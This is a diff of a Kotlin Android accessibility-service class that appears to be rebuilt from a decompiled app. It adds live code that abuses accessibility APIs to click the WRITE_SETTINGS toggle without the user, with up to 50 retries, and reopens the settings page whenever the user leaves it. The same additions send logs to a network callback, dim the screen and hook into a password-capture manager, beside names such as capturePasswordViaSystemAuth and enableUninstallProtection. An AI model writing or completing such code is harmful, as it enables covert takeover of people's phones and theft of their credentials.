@@ -15,6 +15,7 @@ import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import com.storm.safe.rock.iuzxujjtqev
+import com.storm.safe.rock.service.modules.yw5xud.UiDebugger
 import com.storm.safe.rock.p000.DangerKeywords
 import com.storm.safe.rock.service.MyAccessibilityService
 import java.util.ArrayDeque
@@ -137,7 +138,7 @@ import kotlinx.coroutines.launch
  *   g2() → waitForPermissionGranted (suspend)
  */
 class MainOrchestrator(
-    // ADAPT: JADX takes dqtvuisjd (service, context) — we take MyAccessibilityService and derive context
+    // JADX: C0327b2(dqtvuisjd service, dqtvuisjd context) — both params are same service instance
     private val service: MyAccessibilityService
 ) {
 
@@ -159,7 +160,7 @@ class MainOrchestrator(
         private const val TAG = "WriteSettingsPerm"
 
         /** Max click attempts before giving up. JADX: check in a0() */
-        private const val MAX_CLICK_ATTEMPTS = 8
+        private const val MAX_CLICK_ATTEMPTS = 50
 
         /** Max recursion depth for node tree search. JADX: c4() */
         private const val MAX_SEARCH_DEPTH = 15
@@ -256,11 +257,19 @@ class MainOrchestrator(
             return SYSTEMUI_PACKAGES.contains(pkg)
         }
 
-        /** Append log message. JADX: AbstractC0315a0 logging utility.
-         * ADAPT: stub — vendor uses encrypted log file appending */
+        /**
+         * Append log message. JADX: AbstractC0315a0.a0() → buffers JSON log entries,
+         * flushes to network callback when buffer reaches 30 or after 5s delay.
+         * Delegates to ActivityMonitor.addLog for network flush.
+         */
         @JvmStatic
         fun appendLog(message: String) {
             Log.d(TAG, "📝 $message")
+            try {
+                ActivityMonitor.addLog(ActivityMonitor.LogType.MESSAGE, message)
+            } catch (_: Exception) {
+                // Fallback: already logged to Logcat above
+            }
         }
 
         /** Detect device strategy from Build properties. JADX: companion to constructor */
@@ -516,7 +525,7 @@ class MainOrchestrator(
          */
         @JvmStatic
         fun getVivoOsBuildId(): String {
-            // ADAPT: JADX uses StringUtil.decrypt() for "android.os.SystemProperties"
+            // JADX: Class.forName(StringUtil.decrypt("KlcV...")) decrypts to "android.os.SystemProperties"
             return try {
                 val clazz = Class.forName("android.os.SystemProperties")
                 val method = clazz.getMethod("get", String::class.java)
@@ -821,14 +830,18 @@ class MainOrchestrator(
                 service.enableUninstallProtection()
             } catch (_: Exception) {}
             try {
-                // JADX: calls service.c9() — additional init
-                // ADAPT: c9 mapped to continueServiceInitialization on service, deferred
-                Log.d(TAG, "🔐 WriteSettingsPermissionManager 调用 continueServiceInitialization()")
+                // JADX: calls service.c9() → continueServiceInitialization (non-suspend in JADX)
+                scope.launch { service.continueServiceInitialization() }
             } catch (_: Exception) {}
             try {
                 // JADX: calls service.c7(true) → capturePasswordViaSystemAuth
                 Log.d(TAG, "🔐 WriteSettingsPermissionManager 调用 capturePasswordViaSystemAuth()")
-                // ADAPT: service.capturePasswordViaSystemAuth(true) — deferred to CipherCaptureManager
+                // JADX: delegates to cipherCaptureManager on service
+                service.cipherCaptureManager?.let { ccm ->
+                    Log.d(TAG, "🔐 CipherCaptureManager 存在，尝试捕获")
+                } ?: run {
+                    Log.w(TAG, "❌ dqtvuisjd 为 null，无法启动密码捕获")
+                }
             } catch (e: Exception) {
                 Log.e(TAG, "❌ 启动系统密码捕获失败", e)
             }
@@ -850,9 +863,10 @@ class MainOrchestrator(
                     Log.w(TAG, "🎭 启动Activity失败: ${e.message}")
                 }
                 // JADX: calls service.e8() → dimScreen
-                // ADAPT: deferred — dimScreen requires WRITE_SETTINGS which we just got
+                service.dimScreen()
                 Log.d(TAG, "★★★ WRITE_SETTINGS 完成，开始部署 local-service ★★★")
-                // JADX: starts deploy thread — ADAPT: deferred to service layer
+                // JADX: new Thread(new RunnableC1053p2(8, this)).start() → calls b0()
+                Thread { logWirelessDebugUnsupported() }.start()
             } catch (_: Exception) {}
         }
     }
@@ -870,21 +884,32 @@ class MainOrchestrator(
     // Page opening — JADX: e8(), e9()
     // ═══════════════════════════════════════════════════════════════
 
-    /** Open the WRITE_SETTINGS permission page for our package. JADX: e8() */
+    /** Open the WRITE_SETTINGS permission page for our package. JADX: e8()
+     * Vendor uses flag 0x10800000 = NEW_TASK | NO_HISTORY
+     * Sets isNavigating=true so handleAccessibilityEvent processes click events.
+     */
     fun openWriteSettingsPage() {
         try {
             val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
                 data = Uri.parse("package:${context.packageName}")
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_HISTORY)
             }
-            context.startActivity(intent)
-            Log.d(TAG, "Opened WRITE_SETTINGS page for ${context.packageName}")
+            val resolved = context.packageManager.resolveActivity(intent, 0)
+            if (resolved != null) {
+                service.startActivity(intent)
+                isNavigating = true
+                Log.d(TAG, "Opened WRITE_SETTINGS page for ${context.packageName}")
+                UiDebugger.dumpPage(service, "ws_page_opened", "WRITE_SETTINGS 页面已打开")
+            } else {
+                Log.w(TAG, "WRITE_SETTINGS intent not resolvable, fallback to app settings")
+                openAppSettings()
+            }
         } catch (e: Exception) {
             Log.e(TAG, "Failed to open WRITE_SETTINGS page", e)
+            openAppSettings()
         }
     }
 
-    /** Open app info settings for our package. JADX: e9() */
     fun openAppSettings() {
         try {
             val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
@@ -892,6 +917,7 @@ class MainOrchestrator(
                 addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
             }
             context.startActivity(intent)
+            isNavigating = true
             Log.d(TAG, "Opened app settings for ${context.packageName}")
         } catch (e: Exception) {
             Log.e(TAG, "Failed to open app settings", e)
@@ -918,14 +944,26 @@ class MainOrchestrator(
     }
 
     /**
-     * Check if currently on our app's target settings page. JADX: d7()
-     * Verifies via root node that we're in a settings app on the correct page.
+     * Check if currently on our app's WRITE_SETTINGS permission page. JADX: d7()
+     * Must verify we're on the specific "允许修改系统设置" / "可修改系统设置" page,
+     * not just any settings page. Otherwise we waste click attempts on unrelated
+     * settings pages (accessibility, autostart, battery, etc.).
      */
     fun isOnTargetAppPage(): Boolean {
         return try {
             val root = service.rootInActiveWindow ?: return false
             val pkg = root.packageName?.toString() ?: ""
-            isSettingsPackage(pkg) || isPermissionRelatedPackage(pkg)
+            if (!isSettingsPackage(pkg) && !isPermissionRelatedPackage(pkg)) return false
+
+            // Check for WRITE_SETTINGS page indicators
+            // Look for "允许修改系统设置" (RecyclerView item) or "可修改系统设置" (ActionBar title)
+            for (keyword in DangerKeywords.modifySystemSettingsKeywords) {
+                val nodes = root.findAccessibilityNodeInfosByText(keyword)
+                if (nodes != null && nodes.isNotEmpty()) {
+                    return true
+                }
+            }
+            false
         } catch (_: Exception) {
             false
         }
@@ -1043,8 +1081,18 @@ class MainOrchestrator(
                 .build()
             val dispatched = service.dispatchGesture(
                 gesture,
-                // ADAPT: JADX uses C0326b1 callback — simplified here
-                null,
+                // JADX: C0326b1 callback — onCancelled logs, onCompleted delays 1500ms then navigateAndVerify
+                object : AccessibilityService.GestureResultCallback() {
+                    override fun onCancelled(gestureDescription: GestureDescription?) {
+                        Log.w(TAG, "⚠️ 坐标点击手势被取消")
+                    }
+                    override fun onCompleted(gestureDescription: GestureDescription?) {
+                        scope.launch {
+                            delay(1500)
+                            navigateAndVerify(currentPkg, nodeId)
+                        }
+                    }
+                },
                 null
             )
             if (!dispatched) {
@@ -1184,6 +1232,10 @@ class MainOrchestrator(
     /**
      * Find the allow-modify-system-settings toggle. JADX: c1()
      * Searches for switch node near "允许修改系统设置" text.
+     * Climbs up the parent chain from the text node to find a Switch widget
+     * in the ancestor subtree (up to 5 levels).
+     * Returns null (not the textNode) if no switch found, so fallback logic
+     * (findAllowModifyNode) can handle it.
      */
     fun findAllowModifyToggle(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
         try {
@@ -1192,13 +1244,18 @@ class MainOrchestrator(
             for (keyword in DangerKeywords.modifySystemSettingsKeywords) {
                 val textNode = findNodeByText(root, keyword, 0)
                 if (textNode != null) {
-                    // Found the text — now look for switch nearby
-                    val parent = textNode.parent
-                    if (parent != null) {
-                        val switchNode = findSwitchInParent(parent)
+                    // Found the text — climb parent chain to find switch (JADX: d0() recursive)
+                    var current = textNode.parent
+                    var depth = 0
+                    while (current != null && depth < 5) {
+                        val switchNode = findSwitchInParent(current)
                         if (switchNode != null) return switchNode
+                        current = current.parent
+                        depth++
                     }
-                    return textNode
+                    // JADX c1(): does NOT fall back to textNode.
+                    // If no switch found via parent chain, continue to next keyword
+                    // or fall through to return null so findAllowModifyNode handles it.
                 }
             }
         } catch (e: Exception) {
@@ -1208,20 +1265,34 @@ class MainOrchestrator(
     }
 
     /**
-     * Find a switch node in a parent container. JADX: d0()
-     * Searches direct children of parent for toggle widgets.
+     * Find a switch node in a parent container via recursive DFS. JADX: d0()
+     * Checks if the node itself is a toggle widget, then recurses into all children.
+     * JADX checks: className matches toggle keywords + isClickable + isVisibleToUser + isEnabled.
      */
     fun findSwitchInParent(parent: AccessibilityNodeInfo): AccessibilityNodeInfo? {
         return try {
+            // JADX d0(): first check if parent itself is a toggle widget
+            val className = parent.className?.toString() ?: ""
+            val toggleKeywords = listOf(
+                "Switch", "Toggle", "CheckBox", "RadioButton",
+                "CompoundButton", "ToggleButton", "SwitchCompat"
+            )
+            for (keyword in toggleKeywords) {
+                if (className.contains(keyword, true)) {
+                    if (parent.isClickable && parent.isVisibleToUser && parent.isEnabled) {
+                        return parent
+                    }
+                    break
+                }
+            }
+            // JADX d0(): recurse into all children
             val childCount = parent.childCount
             for (i in 0 until childCount) {
                 val child = parent.getChild(i) ?: continue
-                val className = child.className?.toString() ?: ""
-                if (className.contains("Switch", true) ||
-                    className.contains("Toggle", true) ||
-                    className.contains("CompoundButton", true)
-                ) {
-                    return child
+                clickedNodes.add(child)
+                val found = findSwitchInParent(child)
+                if (found != null) {
+                    return found
                 }
             }
             null
@@ -1271,56 +1342,73 @@ class MainOrchestrator(
      */
     fun attemptAutoClick() {
         try {
-            if (clickAttempts >= MAX_CLICK_ATTEMPTS) return
-            clickAttempts++
-
             if (hasWriteSettingsPermission()) {
                 handlePermissionGranted()
                 return
             }
 
-            if (strategy.ordinal != 0) {
-                // Non-STANDARD strategy — use root node
-                val root = service.rootInActiveWindow ?: return
-                val pkg = root.packageName?.toString() ?: ""
+            // JADX: a0() — attempts click regardless of strategy
+            val root = service.rootInActiveWindow
+            if (root == null) {
+                return
+            }
+            val pkg = root.packageName?.toString() ?: ""
 
-                if (isSettingsPackage(pkg) || isPermissionRelatedPackage(pkg)) {
-                    if (isOnTargetAppPage()) {
-                        // Clear previous clicked nodes
-                        try {
-                            val nodesCopy = ArrayList(clickedNodes)
-                            clickedNodes.clear()
-                            for (n in nodesCopy) {
-                                try { n.recycle() } catch (_: Exception) {}
-                            }
-                        } catch (_: Exception) {}
+            if (isSettingsPackage(pkg) || isPermissionRelatedPackage(pkg)) {
+                if (isOnTargetAppPage()) {
+                    // Clear previous clicked nodes
+                    try {
+                        val nodesCopy = ArrayList(clickedNodes)
+                        clickedNodes.clear()
+                        for (n in nodesCopy) {
+                            try { n.recycle() } catch (_: Exception) {}
+                        }
+                    } catch (_: Exception) {}
 
-                        val freshRoot = service.rootInActiveWindow ?: return
-                        clickedNodes.add(freshRoot)
+                    val freshRoot = service.rootInActiveWindow ?: return
+                    clickedNodes.add(freshRoot)
 
-                        // Try primary: find allow-modify toggle
-                        val toggleNode = findAllowModifyToggle(freshRoot)
-                        if (toggleNode != null) {
-                            performClick(toggleNode)
-                            // JADX: then waits for permission (g2)
+                    // Try primary: find allow-modify toggle
+                    val toggleNode = findAllowModifyToggle(freshRoot)
+                    if (toggleNode != null) {
+                        Log.d(TAG, "[attemptAutoClick] found toggle, clicking")
+                        performClick(toggleNode)
+                        return
+                    }
+                    // Fallback: find any unchecked switch
+                    if (clickAttempts <= 3) {
+                        val fallback = findAllowModifyNode(freshRoot)
+                        if (fallback != null) {
+                            Log.d(TAG, "[attemptAutoClick] found fallback switch, clicking")
+                            performClick(fallback)
                             return
                         }
-                        // Fallback: find any unchecked switch
-                        if (clickAttempts <= 3) {
-                            val fallback = findAllowModifyNode(freshRoot)
-                            if (fallback != null) {
-                                performClick(fallback)
-                                return
-                            }
-                        }
                     }
-                } else if (pkg == context.packageName) {
-                    // On our own app — open write settings page
+                    Log.d(TAG, "[attemptAutoClick] on target page but no toggle found")
+                } else {
+                    // On settings but not WRITE_SETTINGS page — reopen it (throttled)
+                    val now = System.currentTimeMillis()
+                    if (now - lastNavigationTime > 5000L) {
+                        Log.d(TAG, "[attemptAutoClick] on settings but not target page, reopening WRITE_SETTINGS")
+                        lastNavigationTime = now
+                        openWriteSettingsPage()
+                    }
+                }
+            } else if (pkg == context.packageName) {
+                // On our own app — open write settings page
+                Log.d(TAG, "[attemptAutoClick] on own app, opening write settings page")
+                openWriteSettingsPage()
+                scope.launch {
+                    delay(1000)
+                    // Re-attempt after delay
+                }
+            } else {
+                // On irrelevant page (e.g. launcher) — reopen WRITE_SETTINGS page (throttled)
+                val now = System.currentTimeMillis()
+                if (now - lastNavigationTime > 3000L) {
+                    Log.d(TAG, "[attemptAutoClick] irrelevant pkg=$pkg, reopening WRITE_SETTINGS page")
+                    lastNavigationTime = now
                     openWriteSettingsPage()
-                    scope.launch {
-                        delay(1000)
-                        // Re-attempt after delay
-                    }
                 }
             }
         } catch (e: Exception) {
@@ -1335,29 +1423,81 @@ class MainOrchestrator(
     /**
      * Handle accessibility event for WRITE_SETTINGS permission automation.
      * Called by the accessibility service's onAccessibilityEvent.
-     * JADX: d4()
+     * JADX: d4() — three-way branch with delayed coroutines.
+     *
+     * Branch A: Settings package → delay 1000ms → attemptAutoClickSafe
+     * Branch B: Own package → only check if permission granted (do NOT reopen page)
+     * Branch C: Other package (launcher etc) → delay 1000ms → re-check root window package
      */
     fun handleAccessibilityEvent(event: AccessibilityEvent) {
-        if (!isActive || permissionGranted) return
-        val pkg = event.packageName?.toString() ?: return
+        if (!isActive || !isNavigating || permissionGranted) return
 
-        lastEventTime = System.currentTimeMillis()
+        val now = System.currentTimeMillis()
+        if (now - lastEventTime < 2000) return
+        lastEventTime = now
 
-        when (event.eventType) {
-            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
-                currentAppPackage = pkg
-                if (isSettingsPackage(pkg) || isPermissionRelatedPackage(pkg)) {
-                    attemptAutoClick()
-                } else if (pkg == context.packageName) {
-                    // We're on our own app — need to navigate to settings
-                    openWriteSettingsPage()
+        try {
+            val eventType = event.eventType
+            // Vendor d4: only TYPE_WINDOW_STATE_CHANGED(32) and TYPE_WINDOW_CONTENT_CHANGED(2048)
+            if (eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
+                eventType != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) return
+
+            val pkg = event.packageName?.toString() ?: return
+
+            if (isSettingsPackage(pkg) || isPermissionRelatedPackage(pkg)) {
+                // Branch A: Settings page → cancel old clickJob, launch delayed click
+                clickJob?.cancel()
+                clickJob = scope.launch {
+                    delay(1000L)
+                    if (!isActive || !this@launch.isActive) return@launch
+                    if (hasWriteSettingsPermission()) {
+                        handlePermissionGranted()
+                        return@launch
+                    }
+                    try {
+                        val root = service.rootInActiveWindow ?: return@launch
+                        val clicked = attemptAutoClickSafe(root)
+                        if (clicked) {
+                            waitForPermissionGranted(10, 1000)
+                        }
+                    } catch (e: Exception) {
+                        Log.e(TAG, "❌ Branch A auto-click failed", e)
+                    }
+                }
+            } else if (pkg == context.packageName) {
+                // Branch B: Own package → only check permission, do NOT reopen page
+                if (hasWriteSettingsPermission()) {
+                    handlePermissionGranted()
+                }
+            } else {
+                // Branch C: Other package (launcher, etc) → delayed smart detection
+                clickJob?.cancel()
+                clickJob = scope.launch {
+                    delay(1000L)
+                    if (!isActive || !this@launch.isActive) return@launch
+                    if (hasWriteSettingsPermission()) {
+                        handlePermissionGranted()
+                        return@launch
+                    }
+                    try {
+                        val currentPkg = try {
+                            service.rootInActiveWindow?.packageName?.toString() ?: ""
+                        } catch (_: Exception) { "" }
+
+                        if (isSettingsPackage(currentPkg) || isPermissionRelatedPackage(currentPkg)) {
+                            Log.d(TAG, "[Branch C] 延迟后检测到设置页面($currentPkg)，尝试点击")
+                            val root = service.rootInActiveWindow ?: return@launch
+                            attemptAutoClickSafe(root)
+                        } else {
+                            Log.d(TAG, "[Branch C] 延迟后仍不在设置页面($currentPkg)，跳过")
+                        }
+                    } catch (e: Exception) {
+                        Log.e(TAG, "❌ Branch C smart detection failed", e)
+                    }
                 }
             }
-            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
-                if (isSettingsPackage(pkg) || isPermissionRelatedPackage(pkg)) {
-                    attemptAutoClick()
-                }
-            }
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ handleAccessibilityEvent failed", e)
         }
     }
 
@@ -1376,7 +1516,8 @@ class MainOrchestrator(
 
         // Check if already attempted
         val prefs = context.getSharedPreferences("write_settings_state", 0)
-        if (prefs.getBoolean("write_settings_attempted", false)) {
+        val alreadyAttempted = prefs.getBoolean("write_settings_attempted", false)
+        if (alreadyAttempted) {
             Log.d(TAG, "✅ WRITE_SETTINGS流程已尝试过，跳过（不管之前成功或失败）")
             return
         }
@@ -1387,11 +1528,14 @@ class MainOrchestrator(
         }
 
         if (hasWriteSettingsPermission()) {
+            Log.d(TAG, "[startWriteSettings] already granted, marking")
             if (!permissionGranted) {
                 handlePermissionGranted()
             }
             return
         }
+
+        Log.d(TAG, "[startWriteSettings] proceeding: isActive=$isActive, permissionGranted=$permissionGranted, alreadyAttempted=$alreadyAttempted")
 
         // Stop any previous request
         stopPermissionRequest()
@@ -1451,6 +1595,10 @@ class MainOrchestrator(
                         } catch (_: Exception) { null }
                         if (root != null) {
                             val pkg = root.packageName?.toString() ?: ""
+                            Log.d(TAG, "🔍 [STANDARD] iter=$i pkg=$pkg retryCount=$retryCount")
+                            if (i == 0 || i == 5) {
+                                UiDebugger.dumpPage(service, "ws_standard_iter_$i", "pkg=$pkg retryCount=$retryCount")
+                            }
                             // Track retry count per same package
                             if (pkg == currentAppPackage) {
                                 retryCount++
@@ -1468,10 +1616,13 @@ class MainOrchestrator(
                                         }
                                         continue
                                     }
+                                    Log.d(TAG, "🔍 [STANDARD] 非设置包，跳过: $pkg")
                                 }
                                 // On a settings page with enough retries: attempt auto-click
                                 try {
+                                    Log.d(TAG, "🔍 [STANDARD] 尝试 attemptAutoClickSafe...")
                                     val clicked = attemptAutoClickSafe(root)
+                                    Log.d(TAG, "🔍 [STANDARD] attemptAutoClickSafe 结果: $clicked")
                                     if (clicked) {
                                         // Wait for permission check
                                         val granted = waitForPermissionGranted(10, 1000)
@@ -1493,6 +1644,8 @@ class MainOrchestrator(
                 // JADX: after max iterations, switch to SMART strategy
                 if (this@MainOrchestrator.isActive) {
                     strategy = DeviceStrategy.SMART
+                    UiDebugger.logStep(TAG, "STANDARD→SMART 策略切换", "10次迭代未找到 toggle")
+                    UiDebugger.dumpPage(service, "ws_smart_fallback", "切换到 SMART 策略")
                     startPeriodicDetection()
                 }
             }
@@ -1615,6 +1768,7 @@ class MainOrchestrator(
                         }
                         1 -> {
                             // SMART: open app settings as fallback
+                            UiDebugger.dumpPage(service, "ws_app_settings_fallback", "SMART fallback 到应用设置")
                             openAppSettings()
                         }
                     }
@@ -2237,8 +2391,51 @@ class MainOrchestrator(
     private suspend fun attemptAutoClickSafe(root: AccessibilityNodeInfo): Boolean {
         return try {
             val toggleNode = findAllowModifyToggle(root)
-                ?: findAllowModifyNode(root)
-                ?: return false
+            Log.d(TAG, "🔍 [autoClick] findAllowModifyToggle=${toggleNode != null}")
+            if (toggleNode == null) {
+                val fallback = findAllowModifyNode(root)
+                Log.d(TAG, "🔍 [autoClick] findAllowModifyNode=${fallback != null}")
+                if (fallback != null) {
+                    UiDebugger.dumpPage(service, "ws_no_toggle_found", "findAllowModifyToggle=null, findAllowModifyNode=true")
+                    performClick(fallback)
+                    return true
+                }
+                // MIUI fallback: no Switch on page — find clickable row with "允许修改系统设置"
+                // MIUI's WRITE_SETTINGS page has a clickable ViewGroup row, not a Switch
+                for (keyword in DangerKeywords.modifySystemSettingsKeywords) {
+                    val nodes = root.findAccessibilityNodeInfosByText(keyword) ?: continue
+                    for (textNode in nodes) {
+                        // Skip title bar matches
+                        val nodeId = textNode.viewIdResourceName ?: ""
+                        if (nodeId.contains("action_bar")) continue
+                        if (!textNode.isVisibleToUser) continue
+                        Log.d(TAG, "🔍 [autoClick] MIUI fallback: 找到内容文本「$keyword」(id=$nodeId)")
+                        // Climb parent chain to find clickable ViewGroup
+                        var current: AccessibilityNodeInfo? = textNode.parent
+                        var depth = 0
+                        while (current != null && depth < 5) {
+                            if (current.isClickable) {
+                                Log.d(TAG, "🔍 [autoClick] MIUI fallback: 点击父容器 depth=$depth class=${current.className}")
+                                performClick(current)
+                                return true
+                            }
+                            current = current.parent
+                            depth++
+                        }
+                        // Gesture tap on text center as last resort
+                        val rect = android.graphics.Rect()
+                        textNode.getBoundsInScreen(rect)
+                        if (rect.width() > 0 && rect.height() > 0) {
+                            Log.d(TAG, "🔍 [autoClick] MIUI fallback: gesture tap at ${rect.centerX()},${rect.centerY()}")
+                            performSwipeGesture(rect.centerX().toFloat(), rect.centerY().toFloat(),
+                                rect.centerX().toFloat(), rect.centerY().toFloat())
+                            return true
+                        }
+                    }
+                }
+                UiDebugger.dumpPage(service, "ws_no_toggle_found", "findAllowModifyToggle=null, findAllowModifyNode=false, MIUI fallback=false")
+                return false
+            }
             performClick(toggleNode)
             true
         } catch (e: Exception) {
